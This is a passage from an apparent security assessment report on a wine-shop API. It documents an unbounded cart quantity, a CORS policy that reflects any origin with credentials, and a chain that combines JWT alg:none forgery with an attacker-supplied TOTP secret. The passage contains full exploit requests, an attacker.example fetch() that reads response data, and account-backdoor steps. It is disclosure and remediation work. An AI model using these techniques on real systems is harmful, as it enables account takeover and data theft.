The vulnerability is a direct consequence of input validation being applied per-handler rather than in the `Cart` domain layer: the `POST /cart/add` handler contains a `Quantity must be between 1 and 12.` check that `PUT /cart/update` lacks entirely.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  Missing Quantity Validation on PUT /cart/update                     │
│  Root cause: per-handler validation; PUT handler skips the check.    │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites: authenticated user + any wine_id (from GET /wines).

  ┌───────────┐                              ┌──────────────────────┐
  │ Attacker  │                              │  api.taintedport.com │
  │ (any user)│                              │      (backend)       │
  └─────┬─────┘                              └──────────┬───────────┘
        │                                               │
   [1]  │ POST /auth/login {creds}                      │
        │──────────────────────────────────────────────►│
        │                                       200 OK  │
        │◄────────────────────────────── {token: <jwt>} │
        │                                               │
   [2]  │ POST /cart/add                                │
        │      {wine_id:3, quantity:13}                 │
        │──────────────────────────────────────────────►│  ┌─────────────────┐
        │                                               │  │ /cart/add       │
        │       400 "Quantity must be between 1..12"    │──│ validate 1..12  │
        │◄──────────────────────────────────────────────│  │ (ENFORCED)      │
        │  invariant is documented and enforced HERE    │  └─────────────────┘
        │                                               │
   [3]  │ POST /cart/add {wine_id:15, quantity:1}       │  seed a legal line
        │──────────────────────────────────────────────►│
        │                              200 Item added   │
        │◄──────────────────────────────────────────────│
        │                                               │
   [4]  │ PUT /cart/update                              │
        │      {wine_id:15, quantity:2147483647}   ◄─── bypass !
        │──────────────────────────────────────────────►│  ┌─────────────────┐
        │                                               │  │ /cart/update    │
        │                      200 "Cart updated"       │──│ (NO VALIDATION) │
        │◄──────────────────────────────────────────────│  │ writes verbatim │
        │                                               │  └────────┬────────┘
        │                                               │           │
        │                                               │           ▼
        │                                               │  cart_items.quantity
        │                                               │        = 2147483647
        │                                               │
   [5]  │ GET /cart                                     │
        │──────────────────────────────────────────────►│
        │  200 {items:[{wine_id:15, quantity:2147483647,│
        │              price:240, subtotal:515396075280}│
        │        ], total:515396075280}                 │
        │◄──────────────────────────────────────────────│
        │                                               │
        │  ── total attacker-controlled: 5.15e11 EUR ── │
        │                                               │
   [6]  │ (optional) POST /orders {shipping_address...} │  order persisted
        │──────────────────────────────────────────────►│  at manipulated total
        │                                               │

  Alternate variant — silent deletion via non-positive quantity:

        │ PUT /cart/update {wine_id:15, quantity:-3}    │
        │──────────────────────────────────────────────►│
        │              200 "Cart updated"               │  row deleted
        │◄──────────────────────────────────────────────│  (no error)

  Root cause summary
  ──────────────────
    * Domain invariant `1 <= quantity <= 12` lives in ONE handler
      (POST /cart/add) instead of the Cart domain model.
    * PUT /cart/update was written without that check and no DB-level
      CHECK constraint backstops it.
    * Fix: central validate_cart_quantity() helper + DB CHECK constraint.
```


#### Impact

- Any authenticated user (no elevated privileges required) can bypass the merchant's 1..12 quantity cap and set line-item quantities to arbitrary integers.
- Order totals derived from `price * quantity` become attacker-controlled. In our reproduction, a single line reached `515,396,075,280 EUR` (~5.15 × 10^11) using wine_id=15 (Niepoort Redoma Branco, 240 EUR) and quantity=2147483647.
- Non-positive quantities silently mutate cart state (row deletion), providing an unexpected side channel that bypasses the normal `DELETE /cart/remove/{id}` path.
- Downstream systems that trust the cart/order rows — fraud thresholds, tax bands, free-shipping logic, business dashboards, inventory reservations, payment holds, and partner integrations (warehouse/fulfilment) — will operate on data that violates the merchant's own domain invariant.
- Acts as an enabling amplifier for other cart/order manipulation findings (e.g. any negative-total scenario): where a single-unit attack yields limited monetary impact, this quantity bypass scales it by up to 2^31 - 1.

#### Technical Analysis

The application has two endpoints that mutate cart line quantities:

- `POST /cart/add` — validates `quantity` and returns `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}` for any value outside `[1, 12]`.
- `PUT /cart/update` — performs no comparable validation. Any integer sent in the JSON `quantity` field is accepted; the response is always `HTTP 200 {"success":true,"message":"Cart updated"}`.

Direct comparison against the same account, same session, same wine_id:

| Payload | POST /cart/add | PUT /cart/update |
|---|---|---|
| `{"wine_id":X,"quantity":13}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" |
| `{"wine_id":X,"quantity":-1}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" (row deleted) |
| `{"wine_id":X,"quantity":999}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" |
| `{"wine_id":X,"quantity":2147483647}` | 400 "Quantity must be between 1 and 12." | 200 "Cart updated" (subtotal = price × 2147483647) |
| `{"wine_id":X,"quantity":0}` | 400 (missing-field validation triggers first) | 200 "Cart updated" (row deleted) |

The persisted cart is then observable via `GET /cart`:

```
{"success":true,"items":[{"wine_id":15,"quantity":2147483647,"price":240,
                          "subtotal":515396075280}],"total":515396075280}
```

Root cause is a per-handler validation pattern instead of a central `Cart::updateQuantity(qty)` domain method that raises on out-of-range values. There is no database-level `CHECK` constraint on `cart_items.quantity` to backstop the missing application-layer check either, since the row is stored verbatim.

Classification:
- CWE-20 (Improper Input Validation) — primary.
- CWE-841 (Improper Enforcement of Behavioral Workflow) — the domain rule is enforced on one workflow entry point but not another.
- CWE-682 (Incorrect Calculation) — for the resulting `subtotal`/`total` values that carry the corrupted quantity.


#### Proof of Concept


Prerequisites:
- An authenticated user account (any role; regular user is sufficient). The scan used `luis.grangeia@snyk.io`.
- Knowledge of any `wine_id` (readily available from `GET /wines`).

Steps to reproduce:
1. `POST /auth/login` with valid credentials, capture the bearer token.
2. (Optional baseline) `POST /cart/add` with `{"wine_id":3,"quantity":13}` and observe `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}`. This confirms the invariant is documented and enforced elsewhere.
3. `POST /cart/add` with `{"wine_id":15,"quantity":1}` to establish a legal cart line.
4. `PUT /cart/update` with `Content-Type: application/json` and body `{"wine_id":15,"quantity":2147483647}`. Observe `HTTP 200 {"success":true,"message":"Cart updated"}`.
5. `GET /cart` and observe the response contains `"quantity":2147483647,"subtotal":515396075280,"total":515396075280`.
6. (Optional) `POST /orders` with a shipping address to persist the manipulated total as a real order (not exercised in this assessment).
7. Non-positive variant: `PUT /cart/update {"wine_id":15,"quantity":-3}` returns `HTTP 200 "Cart updated"` and `GET /cart` returns an empty items array (row silently deleted).

Reproduction was independently validated against the live target; the `poc.py` script prints per-step verification, and `verify.py` returns exit code 0 with a `[VULNERABLE]` verdict.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Authenticate as regular user (obtain bearer token)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"<redacted>"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"<jwt>"}
```


> Baseline authentication. Any user role can reach the vulnerable endpoint.



**2. Baseline: POST /cart/add correctly enforces 1..12**

*Request:*
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":3,"quantity":13}
```

*Response:*
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"success":false,"message":"Quantity must be between 1 and 12."}
```


> The domain invariant IS enforced on /cart/add. Same message returned for qty=-1, 999, etc.



**3. Seed a legal cart line (wine_id=15 Niepoort Redoma, price=240)**

*Request:*
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":1}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Item added to cart"}
```


> Prerequisite: an existing cart line to update. Any legal add works.



**4. PUT /cart/update accepts INT_MAX quantity - invariant bypassed**

*Request:*
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":2147483647}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```


> Same wine_id, same session, same account - /cart/update returns 200 for a quantity /cart/add rejects with 400. No range check on this handler.



**5. GET /cart shows the inflated total is server-persisted**

*Request:*
```http
GET /cart HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"items":[{"id":381,"wine_id":15,"wine_name":"Niepoort Redoma Branco","price":240,"quantity":2147483647,"subtotal":515396075280}],"total":515396075280}
```


> Cart total is 515,396,075,280 EUR (~5.15 x 10^11) from a single line. POST /orders would consume this cart state to create a real order.



**6. Non-positive quantities silently delete the cart row**

*Request:*
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"wine_id":15,"quantity":-3}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```


> Server responds Cart updated, but GET /cart shows empty items - the row was deleted rather than an error being returned. Zero exhibits identical behaviour.





#### Remediation

1. Apply the same `1 <= quantity <= 12` validation in the `PUT /cart/update` handler as in `POST /cart/add`. Return `HTTP 400 {"success":false,"message":"Quantity must be between 1 and 12."}` for out-of-range values so behaviour is consistent between the two endpoints.
2. Extract the quantity validation into a single shared helper (e.g. `validate_cart_quantity(qty)`) or move it into the `Cart` domain model (`Cart::updateQuantity(qty)` raising `InvalidArgumentException` for non-positive or `>12` values). Call the helper from every handler that mutates cart quantities, including any future admin/import flows.
3. Add a `CHECK (quantity BETWEEN 1 AND 12)` constraint on the `cart_items.quantity` column (and equivalent on `order_items.quantity`) as a defense-in-depth backstop against future handlers regressing.
4. Reject the case `quantity == 0` and `quantity < 0` explicitly on `PUT /cart/update`. If a "remove item" affordance is desired, require callers to use `DELETE /cart/remove/{wine_id}` — do not overload `PUT /cart/update` with silent row-deletion semantics.
5. Add integration tests that exercise `POST /cart/add`, `PUT /cart/update`, and any bulk-import endpoints against the same invalid-quantity matrix (`13`, `0`, `-1`, `-5`, `99999`, `2147483647`) and assert `HTTP 400` from all of them.
6. Audit related domain endpoints (`/cart/*`, `/orders/*`) for the same pattern: per-handler validation of a shared invariant is a known anti-pattern; ensure other cart/order fields (unit price, coupon amounts, shipping, tax rate, etc.) are validated centrally.

---


### vuln-0004: CORS Misconfiguration — Arbitrary Origin Reflected with Allow-Credentials on Both API Hosts










**Severity:** LOW | **CVSS:** 3.1 | **Endpoint:** `/* (all paths on both API mount points, including preflight)` | **Method:** GET/POST/PUT/DELETE/OPTIONS | **CWE:** CWE-942 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`

#### Description

Both `https://api.taintedport.com/*` and `https://taintedport.com/api/*` (two mount points served by the same PHP 8.2.31 backend) reflect the value of the client-supplied `Origin` request header verbatim into `Access-Control-Allow-Origin` and always emit `Access-Control-Allow-Credentials: true`. This behaviour is exhibited on GET, POST, PUT, DELETE and — critically — on the `OPTIONS` preflight, including for state-changing endpoints such as `POST /auth/login`. The special value `Origin: null` is accepted. No `Vary: Origin` header is set on any response.

This is the canonical broken CORS configuration explicitly forbidden by the CORS specification: a wildcard-equivalent (any reflected Origin) must never be paired with `Access-Control-Allow-Credentials: true`.

Attacker origins independently verified as reflected with `ACAC: true` across `/wines`, `/auth/me`, `/api/wines` and `OPTIONS /auth/login` (21/21 combinations):

- `https://attacker.example` — arbitrary attacker host
- `null` — sandboxed iframe / `data:` / `file://` document
- `https://taintedport.com.attacker.example` — suffix trick
- `https://eviltaintedport.com` — prefix trick
- `http://taintedport.com` — scheme downgrade
- `file://`
- `chrome-extension://abc`

Root cause is a server-side CORS middleware that echoes the request's `Origin` header instead of comparing it against a strict allow-list.


#### Attack Flow

```
┌───────────────────────────────────────────────────────────────────────┐
│         CORS MISCONFIGURATION — REFLECTED ORIGIN + CREDENTIALS        │
│      https://api.taintedport.com  &  https://taintedport.com/api/*    │
└───────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Victim visits an attacker-controlled page in their browser.
    • (Escalation) a same-origin XSS on taintedport.com or any cookie
      issued on either host.

  ┌───────────────┐                              ┌──────────────────────┐
  │  Victim (UA)  │                              │ attacker.example     │
  │  browses to   │◀── loads page ──────────────▶│ (attacker web page)  │
  │  attacker.tld │                              └──────────┬───────────┘
  └───────┬───────┘                                         │
          │                                                 │
          │  ① fetch('https://api.taintedport.com/wines',   │
          │     {method:'GET',                              │
          │      credentials:'include'})                    │
          │◀────────────────────────────────────────────────┘
          │
          │  Browser adds:  Origin: https://attacker.example
          ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │      TaintedPort API  (PHP 8.2.31 — same backend, two hosts)     │
  │                                                                  │
  │   ┌─ CORS middleware (broken) ─────────────────────────────────┐ │
  │   │ header('Access-Control-Allow-Origin: '                     │ │
  │   │        . $_SERVER['HTTP_ORIGIN']);   ◀── ROOT CAUSE        │ │
  │   │ header('Access-Control-Allow-Credentials: true');          │ │
  │   │ // no allow-list check, no Vary: Origin, `null` accepted   │ │
  │   └────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘
          │
          │  ② HTTP/1.1 200 OK
          │     Access-Control-Allow-Origin: https://attacker.example
          │     Access-Control-Allow-Credentials: true
          │     (no Vary: Origin)
          │     Content-Type: application/json
          │     { ...API response body... }
          ▼
  ┌───────────────┐
  │  Victim (UA)  │  ③ Browser lets attacker page READ the response
  │               │     because ACAO matches Origin and ACAC:true.
  └───────┬───────┘
          │
          │  ④ Attacker page reads response body:
          │       response.text() ── flows back to attacker.example
          ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  Attacker exfiltrates cross-origin response body                 │
  └──────────────────────────────────────────────────────────────────┘

  Origins that all get reflected + ACAC:true (21/21 tested):
     https://attacker.example  |  null  |  file://  |  chrome-extension://…
     https://taintedport.com.attacker.example  (suffix trick)
     https://eviltaintedport.com               (prefix trick)
     http://taintedport.com                    (scheme-downgrade trick)

  Preflight OPTIONS /auth/login → also approves attacker-origin + creds
  + Authorization header ⇒ state-changing calls are green-lit too.

  ── Current effective impact ────────────────────────────────────────
     Auth uses Authorization: Bearer from localStorage; NO cookies are
     issued today, so ambient-credential theft is NOT yet demonstrable.
     Attacker can only cross-origin read data they could also fetch
     server-side. The broken CORS policy is however a live risk.

  ── Escalation paths (any one of these makes this High/Critical) ────
     [A] Any cookie is issued on either host ─────────────────┐
         ⇒ cross-origin credentialed reads ⇒ ACID data theft. │
     [B] Same-origin XSS on taintedport.com ──────────────────┼─► HIGH
         ⇒ steal JWT from localStorage, replay from any origin│
     [C] Reverse proxy adds HTTP Basic / client TLS certs ────┘
     [D] CDN begins caching API responses (Vary: Origin missing)
         ⇒ one origin's ACAO leaked to another requester.

  ── Root cause ──────────────────────────────────────────────────────
     Server echoes the request's Origin header into ACAO without an
     allow-list, and always sets ACAC:true. This is the exact pattern
     forbidden by the CORS specification.
```


#### Impact

**Currently-observed impact (directly exploitable today):**

Any web page under attacker control can, via the victim's browser, make cross-origin requests to the TaintedPort API and read the JSON response. Because `Origin: null` is trusted, the same is possible from a `sandbox="allow-scripts"` iframe, a `data:` document, or a local `file://` page — none of which require the attacker to control a real DNS name. Cross-origin readability of the API is currently limited to data the attacker could also retrieve server-side, since the application uses `Authorization: Bearer <JWT>` from `localStorage.token` and issues no cookies during login. There are therefore no ambient credentials that browsers would attach cross-origin today.

**Live escalation paths inherent in the misconfiguration:**

- If a session cookie, CSRF cookie, analytics cookie, or any other cookie is ever issued on either host, it becomes cross-origin readable / usable from any attacker origin — a fully credentialed CORS breach against every authenticated endpoint.
- Any same-origin XSS on `taintedport.com` (candidates already present in the app: contact-preview reflection, stored review comments, search reflection) can chain with this policy to exfiltrate the JWT from `localStorage` and then re-use it from an arbitrary attacker origin — the API will happily reflect the attacker origin and continue serving authenticated responses.
- If a reverse proxy is later configured to require HTTP Basic auth or client TLS certificates, those credentials become cross-origin readable.
- Missing `Vary: Origin` allows CDN / intermediate caches to serve one origin's ACAO to another requester — a classic CDN CORS defence-in-depth failure that on other stacks yields cache-based CORS attacks.

The policy surface advertised by the server (`ACAC: true` with any-origin reflection, on `Authorization`) is broken independently of the current session mechanism and must be sized against future changes.

#### Technical Analysis

The API's CORS layer constructs `Access-Control-Allow-Origin` by echoing the value of the request's `Origin` header rather than comparing it against an explicit allow-list. Independently verified with `curl`:

    > GET /wines HTTP/1.1
    > Host: api.taintedport.com
    > Origin: https://attacker.example

    < HTTP/1.1 200 OK
    < Access-Control-Allow-Credentials: true
    < Access-Control-Allow-Headers: Content-Type, Authorization
    < Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
    < Access-Control-Allow-Origin: https://attacker.example

Every attacker-origin variant tested is reflected identically. The preflight `OPTIONS /auth/login` request approves the cross-origin authed request with the reflected attacker origin and `Access-Control-Allow-Headers: Content-Type, Authorization`.

The `Server` and `X-Powered-By` headers (`cloudflare` / `PHP/8.2.31`) indicate the CORS block is implemented in the PHP application. The most likely root-cause snippet is:

    header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, Authorization');

— or an equivalent generic-CORS plugin configured to reflect the request's Origin. No allow-list check is performed, and the special value `null` is not rejected.

The bearer-token session model materially reduces the currently-observable exploitability, because no browser will attach any ambient credentials to a cross-origin fetch. However, the CORS policy layer is broken independently of the session mechanism: `Access-Control-Allow-Credentials: true` is a positive assertion that credentials are permitted, and browsers will honour it against any cookies, HTTP Basic authentication, or client TLS certificates that later become associated with these hosts. Missing `Vary: Origin` is a separate defect: any cache in front of the origin can key on the URL alone and serve one requester's Origin-specific ACAO to a different requester.


#### Proof of Concept


1. Send a plain HTTP request to `https://api.taintedport.com/wines` (or `https://taintedport.com/api/wines`, or any `/auth/*`, `/orders/*`, `/cart/*`, `/admin/*` route) with an `Origin: https://attacker.example` request header.
2. Observe the response headers: `Access-Control-Allow-Origin: https://attacker.example` and `Access-Control-Allow-Credentials: true`, with no `Vary: Origin`.
3. Repeat with `Origin: null`, `Origin: https://taintedport.com.attacker.example`, `Origin: file://`, `Origin: chrome-extension://abc` — all reflected identically.
4. Send an `OPTIONS` preflight for `POST /auth/login` with `Origin: https://attacker.example` and `Access-Control-Request-Headers: Authorization, Content-Type` — the server responds with the reflected `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials: true`, and `Access-Control-Allow-Headers: Content-Type, Authorization`, greenlighting cross-origin authenticated calls from the attacker.
5. Full matrix reproducer: `python3 poc/poc.py` — probes 7 attacker origins × 3 endpoints and the preflight, reporting 21/21 reflected+credentialed responses and no `Vary: Origin` header on any response.
6. Regression check: `python3 poc/verify.py` — exits 0 (VULNERABLE) while the misconfiguration persists.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Arbitrary attacker origin reflected on public GET**

*Request:*
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Origin: https://attacker.example
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: https://attacker.example
Content-Type: application/json
X-Powered-By: PHP/8.2.31

{...wine list JSON...}
```


> Server reflects the attacker-supplied Origin verbatim and pairs it with Allow-Credentials: true. No Vary: Origin header is emitted.



**2. `Origin: null` is accepted (sandboxed-iframe attack surface)**

*Request:*
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Origin: null
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: null
Content-Type: application/json

{...wine list JSON...}
```


> The special value `null` is trusted just like any other origin. This is directly exploitable from a sandbox=allow-scripts iframe, a data: document, or a local file:// page — none of which need to control a real DNS name.



**3. Frontend host `/api/*` is equally misconfigured**

*Request:*
```http
GET /api/wines HTTP/1.1
Host: taintedport.com
Origin: https://attacker.example
Accept: application/json
```

*Response:*
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://attacker.example
Content-Type: application/json

{...wine list JSON...}
```


> The same broken policy is served on the frontend host under /api/* (both mount points are backed by the same PHP 8.2 backend).



**4. Preflight OPTIONS approves attacker-origin cross-origin authed request**

*Request:*
```http
OPTIONS /auth/login HTTP/1.1
Host: api.taintedport.com
Origin: https://attacker.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
```

*Response:*
```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: https://attacker.example
```


> The preflight explicitly greenlights an attacker-origin POST that carries an Authorization header. Any endpoint on either host is reachable cross-origin with credentials.



**5. Missing Vary: Origin — CDN cache defence-in-depth failure**

*Request:*
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Origin: https://eviltaintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: https://eviltaintedport.com
Access-Control-Allow-Credentials: true
(no Vary: Origin header)
```


> The response varies its Access-Control-Allow-Origin per request-Origin, but no Vary: Origin header is emitted. If any cache upstream of the origin caches this response, one requester's ACAO can be served to a different requester — a classic CDN CORS defence-in-depth failure.





#### Remediation

1. **Do not reflect `Origin`.** Compare the incoming `Origin` header against a strict, explicit allow-list of trusted front-end origins (e.g. `https://taintedport.com`). On mismatch, emit no `Access-Control-Allow-Origin` header at all — never fall back to `*` or `null`.

2. **Never combine `Access-Control-Allow-Credentials: true` with a wildcard or dynamically-reflected origin.** If an endpoint truly must be fully public and cross-origin readable, drop `Allow-Credentials` and use `Access-Control-Allow-Origin: *`.

3. **Explicitly reject `Origin: null`.** No production origin should legitimately send `null`.

4. **Emit `Vary: Origin` on every response whose CORS headers vary by request** so caches (including Cloudflare) key each origin's response separately.

5. **Restrict `Access-Control-Allow-Methods` per route.** The current blanket `GET, POST, PUT, DELETE, OPTIONS` on every response is over-broad.

6. **Consider applying CORS only where cross-origin access is actually needed.** State-changing endpoints such as `/auth/login`, `/orders`, `/cart/*`, and `/admin/*` do not need to advertise cross-origin support at all.

Concrete PHP snippet:

    $allowed = ['https://taintedport.com'];
    $origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
    header('Vary: Origin', false);
    if (in_array($origin, $allowed, true)) {
        header('Access-Control-Allow-Origin: ' . $origin);
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Allow-Headers: Content-Type, Authorization');
        header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    }
    // else: emit no CORS headers at all — SOP will block the browser.

---



## Attack Chains

| ID | Title | Severity | CVSS | Constituent Vulnerabilities |
|---|---|---|---|---|

| chain-0001 | JWT Signature Bypass + Client-Supplied 2FA Secret → Unauthenticated Persistent Account Takeover | CRITICAL | 10.0 | vuln-0005 → vuln-0013 |

| chain-0002 | Public OpenAPI Disclosure Chains Anonymous Attacker into Authenticated SSRF/LFI and BFLA Admin Bypass on Order Status | CRITICAL | 10.0 | vuln-0002 → vuln-0021 |

| chain-0004 | Persistent Admin Compromise: JWT alg:none Bypass + LFI on /wines/import-url → Exfiltrated HMAC Signing Secret | CRITICAL | 10.0 | vuln-0005 → vuln-0021 |

| chain-0005 | Unauth Admin Acquisition (JWT forgery / Mass Assignment / Login SQLi) + Horizontal IDOR = Bulk bcrypt & TOTP-Secret Exfiltration | CRITICAL | 10.0 | vuln-0005 → vuln-0007 → vuln-0012 → vuln-0003 |

| chain-0006 | Reflected XSS + Missing CSP + Permissive CORS + Client-Supplied 2FA Secret + No JWT Revocation → Persistent Full Account Takeover from a Single Victim Visit | CRITICAL | 9.6 | vuln-0008 → vuln-0014 → vuln-0004 → vuln-0013 → vuln-0018 |

| chain-0003 | Negative-Priced Catalog + Unbounded PUT /cart/update → Durable Negative-Total Order at Arbitrary Scale | HIGH | 7.1 | vuln-0019 → vuln-0010 |



### chain-0001: JWT Signature Bypass + Client-Supplied 2FA Secret → Unauthenticated Persistent Account Takeover








**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoints:** `/auth/me`, `/auth/2fa/enable`, `/auth/login`, `/auth/password`, `/auth/register` | **Method:** POST | **CWE:** CWE-287 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### Chain Steps


1. **vuln-0005** — Zero-cost forgery of a JWT for an arbitrary victim user_id. Reduces the chain's Privileges Required from L to N by providing the bearer token that vuln-0013 requires. Confirmed both alg:none (empty signature) and HS256 with garbage signature are accepted on /auth/me and /auth/2fa/enable.

2. **vuln-0013** — Turns the transient forged session into a permanent backdoor by allowing the attacker to write an attacker-chosen TOTP secret into the victim's account row. This is what makes the takeover survive password rotation, email change, session expiry, and even JWT signing-secret rotation. Confirmed by independent reproduction: attacker still logs in after victim's PUT /auth/password.


#### Description

Two API defects on api.taintedport.com combine into a zero-credential, self-persistent account takeover of any user:

1. **vuln-0005 — JWT signature is not verified.** The JWT middleware base64-decodes the header/payload and reads claims (`user_id`, `is_admin`, `email`) without ever calling HMAC verification. `alg:none` with an empty signature and HS256 with an arbitrary signature are both accepted. `exp` is still parsed (so obviously-expired tokens are rejected), which proves the payload is decoded — the verification step is simply absent.

2. **vuln-0013 — POST /auth/2fa/enable trusts a client-supplied `totp_secret`.** The handler reads BOTH the shared TOTP secret AND the code from the request body, HMAC-verifies the code against the client's secret (which trivially succeeds), and persists the client's secret as the account's canonical `totp_secret` with `totp_enabled=1`. No server-side pending secret is consulted, and the caller's current password is not re-verified.

Chained, an unauthenticated attacker who knows (or enumerates) a victim `user_id`:
  a. Forges a JWT `{alg:none, payload:{user_id:<victim>, exp:9999999999}, sig:""}` — accepted as the victim on every authenticated endpoint.
  b. POSTs `/auth/2fa/enable` with an attacker-generated base32 `totp_secret` and a matching TOTP code — server persists the attacker's secret on the victim account.
  c. The victim can no longer complete login (their authenticator app has no matching entry; there is no self-service MFA reset on this API), while the attacker can log in whenever they wish with `password + HOTP(attacker_secret, now)`.

The persistent artifact is a database-stored `totp_secret` keyed to `user_id`, not a session, so the backdoor survives password rotation, email change, session/JWT expiry, and even rotation of the JWT signing secret.


#### Attack Flow

```
┌───────────────────────────────────────────────────────────────────────────────┐
│  CHAIN: JWT Signature Bypass  ➜  Client-Supplied 2FA Secret                  │
│         ➜  Unauthenticated Persistent Account Takeover                        │
└───────────────────────────────────────────────────────────────────────────────┘

  ATTACKER (unauthenticated)                          api.taintedport.com
  ══════════════════════════                          ═══════════════════

  PHASE ①  Forge a session for the victim  ────────  vuln-0005 (CWE-347)

    Build JWT locally:
      header  = {"alg":"none","typ":"JWT"}
      payload = {"user_id":<victim>,"is_admin":false,
                 "iat":1,"exp":9999999999}
      sig     = ""              (empty — or any bytes with HS256)
                     │
                     │  GET /auth/me
                     │  Authorization: Bearer <forged>
                     ▼
                                    ┌────────────────────────────────┐
                                    │ JWT middleware                 │
                                    │   • base64-decode header       │
                                    │   • base64-decode payload      │
                                    │   • check exp                  │
                                    │   ✗ NO hash_hmac() called      │◄── ROOT
                                    │   ✗ signature ignored          │    CAUSE
                                    └───────────────┬────────────────┘    #1
                                                    │ trusts user_id claim
                                                    ▼
    ✓ HTTP 200 — server treats attacker as victim


  PHASE ②  Install attacker-controlled MFA  ───────  vuln-0013 (CWE-287)

    Generate locally:
      S = base32(random 20 bytes)     ◄── attacker-chosen TOTP secret
      C = HOTP(S, now/30)             ◄── code the client just produced
                     │
                     │  POST /auth/2fa/enable
                     │  Authorization: Bearer <forged>
                     │  {"totp_secret": S,          ◄── ATTACKER-SUPPLIED
                     │   "totp_code" : C}
                     ▼
                                    ┌────────────────────────────────┐
                                    │ 2FA handler                    │
                                    │   • verifies HOTP(S,now/30)==C │
                                    │     (trivially TRUE — client   │
                                    │      generated both S and C)   │
                                    │   ✗ no pending-secret lookup   │◄── ROOT
                                    │   ✗ no current-password check  │    CAUSE
                                    │                                │    #2
                                    │   UPDATE users                 │
                                    │     SET totp_secret   = S,     │
                                    │         totp_enabled = 1       │
                                    │     WHERE id = <victim>        │
                                    └───────────────┬────────────────┘
                                                    │
    ✓ HTTP 200 {"success":true,                    │
                "message":"Two-factor auth …"}◄────┘


  PHASE ③  Backdoor is durable  ─────────────────────  combined chain

    ┌───── Victim's next login ────────────┐   ┌───── Attacker's login ────────┐
    │  POST /auth/login {email,password}   │   │  POST /auth/login             │
    │  → {success:false,requires_2fa:true} │   │    {email, password,          │
    │  → Victim's authenticator app has    │   │     totp_code: HOTP(S,now)}   │
    │    NO seed matching S.               │   │  → HTTP 200 + valid session   │
    │  → No self-service MFA reset exists. │   │    token (legitimately signed)│
    └──────────────────────────────────────┘   └───────────────────────────────┘


  PHASE ④  Persistence proof — password rotation does NOT evict

    Legitimate victim:                          Attacker afterwards:
      PUT /auth/password                          POST /auth/login
        {current_password, new_password}            {email, NEW password,
      → HTTP 200 (password updated)                  totp_code: HOTP(S,now)}
      totp_secret column: UNCHANGED               → HTTP 200 + valid session
                                                  ← attacker still in.


────────────────────────────────────────────────────────────────────────────────
 ROOT CAUSE SUMMARY
   #1 (vuln-0005)  JWT verifier decodes claims without HMAC verification.
                   alg:none and HS256+garbage-signature are both accepted.
   #2 (vuln-0013)  POST /auth/2fa/enable reads the shared TOTP secret from
                   the request body and persists it as the account's
                   canonical secret.  No server-side pending-secret is
                   consulted; current password is not re-verified.

 WHY THE CHAIN IS WORSE THAN ITS PARTS
   • vuln-0005 alone → evictable by JWT-signing-secret rotation.
   • vuln-0013 alone → needs a real session (Privileges Required = L).
   • Chained       → PR drops to N AND persistence survives every
